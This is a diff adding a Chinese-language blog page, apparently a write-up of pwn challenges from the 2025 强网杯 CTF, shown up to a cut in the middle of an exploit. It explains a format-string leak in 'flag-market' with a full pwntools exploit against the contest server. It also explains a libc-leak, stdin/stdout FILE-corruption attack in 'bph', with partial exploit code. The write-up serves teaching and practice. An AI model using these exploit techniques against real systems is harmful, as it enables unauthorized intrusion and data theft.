@@ -1,0 +1,991 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yfor">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/10/29/2025强网杯/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yfor.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yfor.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yfor.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2025强网杯wp | yfor的小pwn窝
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"PingFang SC, -apple-system, BlinkMacSystemFont, 'Microsoft YaHei', sans-serif","url":""},"english":{"enable":true,"family":"'Open Sans', -apple-system, BlinkMacSystemFont, sans-serif","url":"https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap"},"title":{"enable":true,"family":"'Open Sans', PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif","url":"https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg# light mode","dark":"/images/background.jpg"},"title":"yfor's blog","subtitle":{"text":["性格是我的不治之症"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":60,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"center","links":{"github":"https://github.com/yfor-yfor/","instagram":null,"zhihu":null,"twitter":null,"email":"2289014121@qq.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#000000","right":"#ffffff","transparency":80},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-file-text"},"friends":{"path":"/friends","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                yfor的小pwn窝
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-file-text fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/friends"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-file-text fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/friends"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2025强网杯wp</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://nimg.ws.126.net/?url=http%3A%2F%2Fdingyue.ws.126.net%2F2024%2F0602%2Fba5b7469j00seg2na004zd000u000u0m.jpg&thumbnail=660x2147483647&quality=80&type=jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">yfor</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-29 22:49:14</span>
+        <span class="mobile">2025-10-29 22:49:14</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-28 20:43:32</span>
+            <span class="mobile">2025-10-28 20:43:32</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>题目链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/yfor-yfor/-/tree/main/2025%E5%BC%BA%E7%BD%91%E6%9D%AF" >https://github.com/yfor-yfor/-/tree/main/2025%E5%BC%BA%E7%BD%91%E6%9D%AF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="flag-market"><a href="#flag-market" class="headerlink" title="flag-market"></a>flag-market</h1><p>菜单为退出或付钱</p>
+<p>退出即exit</p>
+<p>付钱如果为0xff，就break，如果不是0xff，就关闭流文件，将标志位变成0</p>
+<p>break后清空s，并且将我们输入的内容作为模式，尝试打开user.log</p>
+<p>最后重新再开始菜单流程</p>
+<p>漏洞点：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(<span class="string">&quot;%s&quot;</span>, oflag); </span><br></pre></td></tr></table></figure></div>
+
+<p>scanf的%s输入存在溢出，虽然oflag不在栈上，但是format格式化字符串在</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000004040</span>C0 oflag           db <span class="string">&#x27;everything is ok~&#x27;</span>,<span class="number">0</span></span><br><span class="line">.data:<span class="number">00000000004041</span>C0 format          db <span class="string">&#x27;You are so parsimonious!!!&#x27;</span>,<span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004014</span>AD                 lea     rax, format     ; <span class="string">&quot;You are so parsimonious!!!&quot;</span></span><br><span class="line">.text:<span class="number">00000000004014B</span>4                 mov     rdi, rax        ; format</span><br><span class="line">.text:<span class="number">00000000004014B</span>7                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004014B</span>C                 call    _printf</span><br></pre></td></tr></table></figure></div>
+
+<p>因此我们可以借助这个溢出，修改format为危险的格式化字符串符号</p>
+<p>并且题目最后会重新开始，所以之后就可以借助这个漏洞泄露内容了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/61754205/1760864431222-1e9fd7d7-73ca-45d3-a060-135e0e403e00.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/61754205/1760864457054-e6381a38-3ba2-43fc-840b-650c1ef40f32.png"
+                      alt="img"
+                ></p>
+<p>看图可知，此时堆地址和我们输入的内容都在栈上，他们的偏移量也可知为9和12</p>
+<p>而这个堆地址，与存储flag真实内容的堆地址偏移固定</p>
+<p>因此，我们可以先<code>%9$p</code>泄露堆地址，然后将这个值加上固定偏移当作想要pay的钱数，此时12偏移处就是存储flag地址的堆地址了，再<code>%12$s</code>泄露flag即可。</p>
+<p>因为format格式化字符串符号只能修改一次，不能中途再加入<code>%12$s</code>所以一开始就全部改好</p>
+<p>不过由于是<code>%s</code>的泄露，所以第一次时要输入一个随便的地址，比如0x4040c0，就不会导致报错了</p>
+<h3 id=""><a href="#" class="headerlink" title=""></a><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/61754205/1760864544873-6d178bb8-497a-4751-a202-effdcec82670.png"
+                      alt="img"
+                ></h3><p>可以看到，我们输入的内容就是flag内容的所在堆地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/61754205/1760865931251-e597cf8e-36d2-4482-9c08-25ca15d476f9.png"
+                      alt="img"
+                ></p>
+<p>远程成功获得flag</p>
+<p>exp如下</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;8.147.135.220&quot;</span>,<span class="number">20500</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;2.exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;255&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;opened user.log, please report:\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+<span class="string">b&#x27;%9$p%12$s\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;2.exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(p64(<span class="number">0x4040c0</span>))</span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line"></span><br><span class="line">heap_addr=<span class="built_in">int</span>(io.recv(<span class="number">9</span>),<span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;2.exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;how much you want to pay?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(p64(heap_addr+<span class="number">0x1e0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h1 id="bph"><a href="#bph" class="headerlink" title="bph"></a>bph</h1><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864459885-eb695daa-3462-4680-a050-9a613240e91a.png"
+                      alt="img"
+                ></p>
+<p>拿到题目运行的时候，显示2.38以上才能运行，按照正常出题，应该是2.39的libc</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864464664-2f55c442-8999-4cc0-bff2-492106df1767.png"
+                      alt="img"
+                ></p>
+<p>而在第一次输入的时候，栈上有存在一个libc地址，用2.39的patchelf之后，本地可以成功泄露libc</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(b&quot;Please input your token: &quot;)</span><br><span class="line">io.send(b&quot;a&quot; * 0x28)</span><br><span class="line">io.recvuntil(b&quot;a&quot; * 0x28)</span><br><span class="line">libc_base = u64(io.recv(6).ljust(8, b&quot;\x00&quot;)) - 0xADDAE</span><br><span class="line">log.success(&quot;libc: &quot; + hex(libc_base))</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864459662-e391ae9a-0c36-4e4a-8fca-ab28d40bfb16.png"
+                      alt="img"
+                ></p>
+<p>远程测试之后，发现泄露的libc是对的，所以相当于开始就送了libc</p>
+<p>别的函数功能全是错的，不能编辑，不能泄露，不能删除，delete的整个逻辑还是有问题的，纯。。。</p>
+<p>只有add函数有问题</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864459939-3af034ee-87da-4728-a6eb-b53925697421.png"
+                      alt="img"
+                ></p>
+<p>重点在这，add的时候，如果size过大，就不会申请堆块，ptr就是0，那这样就相当于size-1&#x3D;0，开始的时候拿到libc了，也就是说，如果size和libcbase一样大，就能任意地址写一个0</p>
+<p>题目用stdin进行输入，数据会先存放在输入缓冲区，任意地址写，写到stdin里面的buf base，这样buf base和buf ptr就有差值，这个差值刚好是stdin的开头</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(b&quot;Choice: &quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.recvuntil(b&quot;Size: &quot;)</span><br><span class="line">io.sendline(str(stdin + 0x38 + 1))</span><br><span class="line">io.recvuntil(b&quot;Content: &quot;)</span><br><span class="line">io.send(b&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">dbg()</span><br><span class="line">io.recvuntil(b&quot;Choice: &quot;)</span><br><span class="line">io.send(p64(libc.address + 0x203900) * 3 + p64(libc.address + 0x203918))</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864459967-d8868dce-6e4d-4895-8deb-d4f97eefd0c0.png"
+                      alt="img"
+                ></p>
+<p>这样的话，我们fgets的时候，就能改写stdin，fgets是先把数据读到缓冲区，再拿对应的长度，所以可以写很长的数据</p>
+<p>我们再次改写stdin，这一次可以修改一整个buf base和buf end，改到stdout上，下次就是修改stdout</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864460247-19b510e0-1a86-4cfa-b84c-32f64751d2ac.png"
+                      alt="img"
+                ></p>
+<p>这样就改写掉了</p>
+<p>剩下的就是写stdout，但是这里不是利用puts触发的io，puts没有成功触发，printf可以触发</p>
+<p>不过这里注意，io的开始只能填sh或者0xfdad1800，填上flag字符串就报错</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864460291-637a339b-fd73-48a7-adf0-3ab367670c3f.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864460325-a28b4a5c-789b-4757-a136-c913199fc25c.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42907020/1760864460424-66c21284-c64f-437a-b90c-0ba2628a018a.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 